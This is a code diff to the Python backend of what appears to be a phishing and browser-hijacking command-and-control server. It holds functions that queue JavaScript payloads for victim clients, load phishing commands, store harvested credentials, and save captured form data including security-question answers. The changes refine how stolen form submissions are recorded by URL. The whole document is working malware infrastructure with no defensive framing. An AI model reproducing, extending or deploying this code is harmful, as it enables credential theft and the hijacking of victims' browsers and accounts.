@@ -84,7 +84,7 @@ def add_js_cmd(clientid, pattern, cmd):
                 conn.execute('INSERT INTO PendingPayloads values (%s, %s)', (clientid, payload))
             else:
                 conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s)', (clientid, payload, payload))
-    return 'OK';
+    return 'OK'
 
 def add_phish_cmd(clientid, pattern, cmd):
     if(cmd == "1" or cmd == "2"):
@@ -92,7 +92,7 @@ def add_phish_cmd(clientid, pattern, cmd):
         fileP = open(fStr, "r")
         sendcmd = fileP.read()
         add_js_cmd(clientid, pattern, sendcmd)
-    return 'OK';
+    return 'OK'
 
 """
 Handles creation of new client.
@@ -186,6 +186,12 @@ def store_credential(credentials, clientid):
             #conn.commit()
     
     return 0
+
+def store_form_id_mappings(url, localdef, remotedef):
+    with getConn() as conn:
+        conn.execute('SELECT * FROM FormIDMappings WHERE URL = (%s) AND LocalDef = (%s) AND RemoteDef = (%s)', (url, localdef, remotedef))
+        if(conn.rowcount == 0):
+            conn.execute('INSERT INTO FormIDMappings(URL, LocalDef, RemoteDef) VALUES (%s, %s, %s)', (url, localdef, remotedef))
 
 
 def store_payload(clientid):
@@ -314,11 +320,11 @@ def store_form_data(data, clientid):
                 data.update({"Answer" + str(y) : securityListA[len(securityListQ) + y]})
 
 
-        #if(bool(data) == True):
+        if(bool(data) == True):
             complexData = json.dumps(data)
-            conn.execute('SELECT * FROM ComplexForms WHERE CID = %s AND JSONFORM = %s', (clientid, complexData))
+            conn.execute('SELECT * FROM ComplexForms WHERE CID = %s AND JSONFORM = %s AND URL = %s', (clientid, complexData, url))
             if(conn.rowcount == 0):
                 conn.execute('SELECT * FROM Client WHERE ID = %s', clientid)
                 if(conn.rowcount != 0):
-                    conn.execute('INSERT INTO ComplexForms(CID, JSONFORM) VALUES (%s, %s)', (clientid, complexData))
+                    conn.execute('INSERT INTO ComplexForms(CID, JSONFORM, URL) VALUES (%s, %s, %s)', (clientid, complexData, url))
         #conn.commit()
